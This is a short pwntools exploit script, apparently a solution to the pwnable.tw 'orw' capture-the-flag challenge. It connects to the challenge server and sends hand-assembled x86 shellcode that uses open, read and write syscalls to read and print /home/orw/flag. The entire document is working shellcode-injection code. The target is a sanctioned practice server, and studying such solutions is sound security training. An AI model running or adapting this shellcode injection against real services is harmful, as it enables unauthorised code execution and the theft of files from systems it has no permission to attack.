#!/usr/bin/python2

from pwn import *

p = remote('chall.pwnable.tw', 10001)

p.recv()

shellcode = ''
shellcode += asm('mov eax, 0x5')        # syscall : open
shellcode += asm('mov ebx, 0x804a09c')  # filename
shellcode += asm('mov ecx, 0x0')        # flags
shellcode += asm('mov edx, 0x804a0ab')  # mode
shellcode += asm('int 0x80')
shellcode += asm('mov ebx, eax')        # fd
shellcode += asm('mov eax, 0x3')        # syscall : read
shellcode += asm('mov ecx, 0x804a100')  # buf
shellcode += asm('mov edx, 0x64')       # count
shellcode += asm('int 0x80')
shellcode += asm('mov edx, eax')        # count
shellcode += asm('mov eax, 0x4')        # syscall : write
shellcode += asm('mov ebx, 0x1')        # fd
shellcode += asm('mov ecx, 0x804a100')  # buf
shellcode += asm('int 0x80')
shellcode += '/home/orw/flag\x00'
shellcode += 'r\x00'
p.send(shellcode)

p.interactive()
